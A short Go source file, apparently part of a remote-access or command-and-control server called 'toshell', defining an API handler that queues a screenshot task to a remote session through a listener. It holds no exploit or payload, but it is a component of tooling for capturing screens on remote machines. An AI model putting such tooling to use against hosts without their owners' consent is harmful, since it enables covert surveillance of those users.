package api

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
	"toshell/internal/server/task"
)

// takeScreenshotHandler 处理截图请求
// POST /api/v1/sessions/{id}/screenshot
func (s *Server) takeScreenshotHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.Create(id, task.TaskParams{
		TaskType: "screenshot",
	})
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(id, taskInfo); err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Screenshot task pushed to session %s", id)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id": taskInfo.ID,
		"message": "Screenshot task sent",
	})
}
